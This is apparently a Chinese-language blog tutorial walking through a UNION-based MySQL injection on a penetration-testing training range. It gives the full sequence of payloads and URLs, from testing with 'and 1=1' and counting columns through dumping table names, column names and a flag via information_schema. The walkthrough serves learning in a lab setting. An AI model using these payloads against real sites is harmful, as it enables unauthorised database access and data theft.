---
title: MySQL注入
tags:
  - MySQL
  - 注入
  - 渗透
categories:
  - Web渗透
  - SQL注入

keywords: 注入
cover: >-
  https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2F256c3437bbaf723cc8ec3116b4778dc1.png&refer=http%3A%2F%2Fimg-blog.csdnimg.cn&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1638708492&t=5e93c30cec5b73703dc0c3f4c4ca6d1dyi
abbrlink: 7d3b4823
---







# 一个简单的SQL注入

网站：封神台 https://hack.zkaq.cn/

学习：靶场——训练营-0基础学渗透测试——SQL注入实在靶场-3.1.1SQL注入实战靶场-基础靶场1



### 判断是否存在注入

```
1 and 1=1	//页面正常
1 and 1=2	//页面不正常

所以改页面存在注入
```

```
http://injectx1.lab.aqlab.cn/Pass-01/index.php?id=1 and 1=1
http://injectx1.lab.aqlab.cn/Pass-01/index.php?id=1 and 1=2
```

![](https://www.helloimg.com/images/2021/11/05/CfJzwr.png)

![](https://www.helloimg.com/images/2021/11/05/CfJ07h.png)



### 猜字段

```
1 order by 3	//显示正常
1 order by 4	//显示异常

所以它有3个字段
```

```
http://injectx1.lab.aqlab.cn/Pass-01/index.php?id=1 order by 3
http://injectx1.lab.aqlab.cn/Pass-01/index.php?id=1 order by 4
```

![](https://www.helloimg.com/images/2021/11/05/CfJ8gb.png)

![]()



### 查询字段属性

```
union select 1,2,3
```

```
http://injectx1.lab.aqlab.cn/Pass-01/index.php?id=0 union select 1,2,3
```

![](https://www.helloimg.com/images/2021/11/05/CfJ6WK.png)



### 查询库名

```
union select 1,database(),3
```

```
http://injectx1.lab.aqlab.cn/Pass-01/index.php?id=0 union select 1,database(),3

查询到的数据库库名为error
```

![](https://www.helloimg.com/images/2021/11/05/CfJp4q.png)



### 查询表名

```
union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='error'
```

```
http://injectx1.lab.aqlab.cn/Pass-01/index.php?id=0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='error'

查询到的表名为error_flag和user
```

![](https://www.helloimg.com/images/2021/11/05/CfJUao.png)



### 查询字段

```
union select 1,group_concat(column_name),3 from information_schema.columns where table_name='error_flag'
```

```
http://injectx1.lab.aqlab.cn/Pass-01/index.php?id=0 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='error_flag'

查询到的字段为Id和flag
```

![](https://www.helloimg.com/images/2021/11/05/CfJ7hT.png)



### 查询内容

```
union select 1,(select(group_concat(Id,flag))),3 from error.error_flag
```

```
http://injectx1.lab.aqlab.cn/Pass-01/index.php?id=0 union select 1,(select(group_concat(Id, flag))),3 from error.error_flag
```

![](https://www.helloimg.com/images/2021/11/05/CfJIx1.png)



### 一些基础

```
information_schema		存放了其他数据库名、字段、值等资料的数据库
information_schema.tables	库中存放表名的一个表
information_schema.columns	库中存放字段的一个表
group_concat(table_name)	查询table_name字段中的所有值
table_name		所有表名
column_name		所有字段名
```

